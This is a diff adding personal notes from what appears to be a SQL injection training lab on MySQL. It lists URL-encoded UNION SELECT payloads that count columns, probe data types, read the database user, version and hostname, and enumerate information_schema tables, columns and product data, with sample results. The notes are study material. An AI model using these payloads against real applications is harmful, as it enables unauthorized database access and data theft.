@@ -145,6 +145,49 @@ PAR 1
 --------------------------------------------------------------------
 Lab 4
 SQL injection attack, querying the database type and version on MySQL and Microsoft
+	'+ORDER+BY+2+--+COMMENT
+	DO YOU RETERIVE TEXT OR NUMBER ?
+		'+UNION+SELECT+'A','B'+--+COMMENT
+		'+UNION+SELECT+0,1+--+COMMENT
+		'+UNION+SELECT+'0',1+--+COMMENT
+		'+UNION+SELECT+0,'1'+--+COMMENT
+	DO YOU DISPLAY SELECT A,B IN PAGE ?			YES, NICE.
+	DO YOU USE NON ORACLE ? 			YES BECAUSE SELECT DOESN'T NEED FROM TABLE/DUAL.
+	'+UNION+SELECT+0,CURRENT_USER+--+COMMENT		RESULT IS peter@%
+	'+UNION+SELECT+0,@@version+--+COMMENT			8.0.39-0ubuntu0.20.04.1
+	'+UNION+SELECT+0,@@HOSTNAME+--+COMMENT			b2bd5e6614d7
+	'+UNION+SELECT+0,table_name+FROM+information_schema.tables+--+COMMENT
+	def
+	CHARACTER_SET_NAME
+def
+	DEFAULT_COLLATE_NAME
+def
+	DESCRIPTION
+def
+	MAXLEN
+def
+	CHECK_CLAUSE
+def
+	CONSTRAINT_CATALOG
+def
+	CONSTRAINT_NAME
+def
+	CONSTRAINT_SCHEMA
+def
+	products
+	'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='products'+--+COMMENT
+id
+category
+name
+rating
+price
+image
+released
+description
+		'UNION+SELECT+null,iD+FROM PRODUCTS+--+COMMENT
+		+'UNION+SELECT+null,NAME+FROM+products+--+COMMENT
+		+'UNION+SELECT+null,NAME+IMAGE+FROM+products+--+COMMENT
+
 '+UNION+SELECT+'abc','def'+--+------#	
 '+UNION+SELECT+@@version,+NULL+--+------#
 --------------------------------------------------------------------
